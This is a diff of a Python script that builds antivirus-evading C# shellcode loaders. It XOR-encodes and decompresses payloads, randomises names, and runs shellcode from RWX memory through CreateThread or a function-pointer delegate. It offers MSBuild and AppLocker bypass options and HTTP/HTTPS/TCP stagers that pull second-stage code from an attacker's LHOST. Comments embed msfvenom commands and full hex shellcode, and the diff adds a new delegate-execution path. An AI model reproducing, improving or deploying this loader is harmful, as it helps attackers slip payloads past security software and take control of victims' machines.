@@ -1,18 +1,17 @@
 #!/usr/bin/python
 # This is smokeware, it's like beerware but I don't drink =]
 # Whats sad is AV is a billion dollar industry... I still deliver pizza *sigh*
-# DONE: Fix imports and code / aka 64bit the shit
+# TODO: Have someone cleanup my shit code
 # TODO: more options info, ie. cant use (-a with -m) or (-a with -i) etc...
 # TODO: HostHeaders/SSL...
-# TODO: dll option?
-# TODO: fix virtualquary to support x64 address (still works fyi)
+# TODO: fix virtualquery to support x64 address (still works fyi)
 # TODO: Bypass import hashing...
-# TODO: Have someone cleanup my shit code
 # ProTip: msbuild/installutil will NOT support x64 payloads
 # ./msfvenom -p windows/msgbox -f hex
 # shellcode = d9eb9bd97424f431d2b27731c9648b71308b760c8b761c8b46088b7e208b36384f1875f35901d1ffe1608b6c24248b453c8b54287801ea8b4a188b5a2001ebe334498b348b01ee31ff31c0fcac84c07407c1cf0d01c7ebf43b7c242875e18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c3b20829d489e589c2688e4e0eec52e89fffffff894504bb7ed8e273871c2452e88effffff894508686c6c20416833322e64687573657230db885c240a89e656ff550489c250bba8a24dbc871c2452e85fffffff686f7858206861676542684d65737331db885c240a89e36858202020684d53462168726f6d20686f2c20666848656c6c31c9884c241089e131d252535152ffd031c050ff5508
 # ./msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f hex <-- EXITFUNK is needed!
 # shellcode = fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300
+# check virtualQ with http, https
 import random
 import sys
 import argparse
@@ -100,12 +99,15 @@ def random_names(mod_name = ""):
     if DEBUG and mod_name != "": ret = mod_name
     return ret
 
-def xor_to_format_bytes(data_to_xor, byte_name, xor_key):
+# xor_filler not used currently, but added for sig reversing.
+def xor_to_format_bytes(data_to_xor, byte_name, xor_key, xor_filler = 0x00):
     out_scode = []
     keycounter = 0 
     for i in range(len(data_to_xor)):
-        if keycounter == len(xor_key): keycounter = 0
-        out_scode.append(ord(data_to_xor[i]) ^ xor_key[keycounter])
+        if keycounter == len(xor_key): 
+            keycounter = 0
+        out_scode.append((ord(data_to_xor[i]) ^ xor_key[keycounter]) + xor_filler)
+        keycounter += 1
     byte_string = " byte[] %s = {" % byte_name
     for i in range(len(out_scode)):
         byte_string += hex(out_scode[i])
@@ -179,7 +181,7 @@ def compress_class(DecompressClassName):
     return ret
     
     
-def virtualquary_class(HuntForAddress):
+def virtualquary_class(HuntForAddress, ExecuteDelegate):
     MaxAddress                     = random_names("MaxAddress")
     address                        = random_names("Address")
     Memory_Basic_Information       = random_names("MEMORY_BASIC_INFORMATION")
@@ -197,6 +199,7 @@ def virtualquary_class(HuntForAddress):
     mbi                            = random_names("mbi")
     ret = "[StructLayout(LayoutKind.Sequential)] private struct %s { public IntPtr %s; public IntPtr %s; public uint %s; public IntPtr %s; public uint %s; public uint %s; public uint %s; }\n" % (Memory_Basic_Information, BaseAddress, AllocationBase, AllocationProtect, RegionSize, State, Protect, Type)
     ret += "[DllImport(\"kernel32.dll\")] private static extern int VirtualQueryEx(IntPtr %s, IntPtr %s, out %s lpBuffer, uint %s);\n" % (hProcess, lpAddress, Memory_Basic_Information, dwLength)
+    ret += "[UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate Int32 ExecuteDelegate();\n"
     ret += "static UInt32 %s(){\n" % (HuntForAddress)
     ret += " long %s = 0x7fffffff, %s = 0;\n" % (MaxAddress, address)
     ret += " do {"
@@ -212,8 +215,7 @@ def virtualquary_class(HuntForAddress):
 
 def generate_embed(hexstream):
     xorByteVar            = random_names("xorByteVar")
-    # xor_key               = random.randrange(0,255)
-    xor_key               = xor_multibyte_key(3) #random.randrange(0,255))
+    xor_key               = xor_multibyte_key(random.randrange(0,255))
     xor_key_name          = random_names("XOR_KEY")
     namespace             = random_names("NameSpaceName")
     classname             = random_names("ClassName")
@@ -235,11 +237,12 @@ def generate_embed(hexstream):
     consoleWin            = random_names("ConsoleWindowVariable")
     DecompressClassName   = random_names("DecompressClassName")
     HuntForAddress        = random_names("HuntForAddress")
+    ExecuteDelegate       = random_names("ExecuteDelegate")
     r = [random_names() for x in xrange(14)]
     
     ########################################################
     ## code starts here
-    payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
+    payloadCode = "using System; using System.Runtime.InteropServices;\n"
     if COMPRESS:
         payloadCode += "using System.IO.Compression; using System.IO;\n"
     if APP_LOCKER:
@@ -261,10 +264,10 @@ def generate_embed(hexstream):
     payloadCode += " byte[] %s = new byte[%s.Length];\n" % (genxorReturnChar, genxorByteVar)
     payloadCode += " int v = 0;"
     payloadCode += " for (int i=0; i < %s.Length; i++) {\n" % (genxorByteVar)
-    payloadCode += " if (v == %s.Length) { v = 0; } %s[i] = (byte)(%s[i] ^ %s[v]); }\n" % (genxorKeyVar, genxorReturnChar, genxorByteVar, genxorKeyVar)
+    payloadCode += " if (v == %s.Length) { v = 0; } %s[i] = (byte)(%s[i] ^ %s[v]);\n v = v + 1;}\n" % (genxorKeyVar, genxorReturnChar, genxorByteVar, genxorKeyVar)
     payloadCode += " return %s;}\n" % (genxorReturnChar)
     if VIRTUALQUERY:
-        payloadCode += virtualquary_class(HuntForAddress)
+        payloadCode += virtualquary_class(HuntForAddress, ExecuteDelegate)
     payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
     payloadCode += " if (%s != null) {\n" %(sName)
     if VIRTUALQUERY:
@@ -272,15 +275,17 @@ def generate_embed(hexstream):
         if DEBUG:
             payloadCode += " Console.WriteLine(\"Injecting to Address: {0}\", %s.ToString(\"X4\"));\n" % (funcAddrName)
         # backup...
-        payloadCode += " if (%s == IntPtr.Zero) { %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName)
+        # payloadCode += " if (%s == IntPtr.Zero) { %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName)
+        payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName,funcAddrName, sName)
+        payloadCode += " %s exec = (%s)Marshal.GetDelegateForFunctionPointer(%s, typeof(%s));exec();}}\n" % (ExecuteDelegate, ExecuteDelegate, funcAddrName, ExecuteDelegate)
     else:
         payloadCode += " IntPtr %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
-    payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName,funcAddrName, sName)
-    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
-    payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
-    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
-    payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
-    payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
+        payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName,funcAddrName, sName)
+        payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
+        payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
+        payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
+        payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
+        payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
     if MSBUILD:
         payloadCode += "public override bool Execute() {\n"
     else:
@@ -293,6 +298,8 @@ def generate_embed(hexstream):
     payloadCode += "\n byte[] %s = %s(%s, %s);\n" % (un_xor_payload, genxorName, xorDataBytesName, xor_key_name)
     if COMPRESS:
         payloadCode += " %s = %s(%s);\n" % (un_xor_payload, DecompressClassName, un_xor_payload)
+    if DEBUG: # make sure we have the correct shellcode
+        payloadCode += "Console.WriteLine(BitConverter.ToString(%s));" % (un_xor_payload)
     payloadCode += " %s(%s);" % (injectName, un_xor_payload)
     if MSBUILD:
         payloadCode += "return true;"
@@ -347,6 +354,7 @@ def generate_http_https(LHOST, LPORT, SSL):
     randomName            = random_names("RandomName")
     consoleWin            = random_names("ConsoleWindowVariable")
     HuntForAddress        = random_names("HuntForAddress")
+    ExecuteDelegate       = random_names("ExecuteDelegate")
     r = [random_names() for x in xrange(14)]
     
     payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
@@ -399,7 +407,7 @@ def generate_http_https(LHOST, LPORT, SSL):
     payloadCode += " catch (WebException) {}\n"
     payloadCode += " return %s;}\n" % (sName)
     if VIRTUALQUERY:
-        payloadCode += virtualquary_class(HuntForAddress)
+        payloadCode += virtualquary_class(HuntForAddress, ExecuteDelegate)
     payloadCode += "static void %s(byte[] %s) {\n" % (injectName, sName2)
     payloadCode += " if (%s != null) {\n" % (sName2)
     if VIRTUALQUERY:
@@ -407,15 +415,17 @@ def generate_http_https(LHOST, LPORT, SSL):
         if DEBUG:
             payloadCode += " Console.WriteLine(\"Injecting to Address: {0}\", %s.ToString(\"X4\"));" % (funcAddrName)
         # backup...
-        payloadCode += " if (%s == IntPtr.Zero) { %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName2)
+        payloadCode += " if (%s == IntPtr.Zero) { %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName2)
+        payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName2,funcAddrName, sName2)
+        payloadCode += " %s exec = (%s)Marshal.GetDelegateForFunctionPointer(%s, typeof(%s));exec();}}\n" % (ExecuteDelegate, ExecuteDelegate, funcAddrName, ExecuteDelegate)
     else:
         payloadCode += " IntPtr %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName2)
-    payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName2,funcAddrName, sName2)
-    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
-    payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
-    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
-    payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
-    payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
+        payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName2,funcAddrName, sName2)
+        payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
+        payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
+        payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
+        payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
+        payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
 
     if MSBUILD:
         payloadCode += "public override bool Execute() {\n"
@@ -478,6 +488,7 @@ def generate_tcp(LHOST, LPORT):
     genxorReturnChar      = random_names("GenXorReturnChar")
     xorUrlBytesName       = random_names("xorUrlBytes")
     HuntForAddress        = random_names("HuntForAddress")
+    ExecuteDelegate       = random_names("ExecuteDelegate")
     consoleWin = random_names("ConsoleWindowVariable")
     r = [random_names() for x in xrange(14)]
     
@@ -520,7 +531,7 @@ def generate_tcp(LHOST, LPORT):
     payloadCode += " Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
     payloadCode += " return %s;}\n" %(sName)
     if VIRTUALQUERY:
-        payloadCode += virtualquary_class(HuntForAddress)
+        payloadCode += virtualquary_class(HuntForAddress, ExecuteDelegate)
     payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
     payloadCode += " if (%s != null) {\n" %(sName)
     if VIRTUALQUERY:
@@ -528,15 +539,17 @@ def generate_tcp(LHOST, LPORT):
         if DEBUG:
             payloadCode += " Console.WriteLine(\"Injecting to Address: {0}\", %s.ToString(\"X4\"));\n" % (funcAddrName)
         # backup...
-        payloadCode += " if (%s == IntPtr.Zero) { %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName)
+        # payloadCode += " if (%s == IntPtr.Zero) { %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName)
+        payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName,funcAddrName, sName)
+        payloadCode += " %s exec = (%s)Marshal.GetDelegateForFunctionPointer(%s, typeof(%s));exec();}}\n" % (ExecuteDelegate, ExecuteDelegate, funcAddrName, ExecuteDelegate)
     else:
         payloadCode += " IntPtr %s = VirtualAlloc(0, (UIntPtr)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
-    payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName,funcAddrName, sName)
-    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
-    payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
-    payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
-    payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
-    payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
+        payloadCode += " Marshal.Copy(%s, 0, %s, %s.Length);\n" %(sName,funcAddrName, sName)
+        payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
+        payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
+        payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
+        payloadCode += " %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
+        payloadCode += " WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
     # to override execute we must use bool
     if MSBUILD:
         payloadCode += "public override bool Execute() {\n"
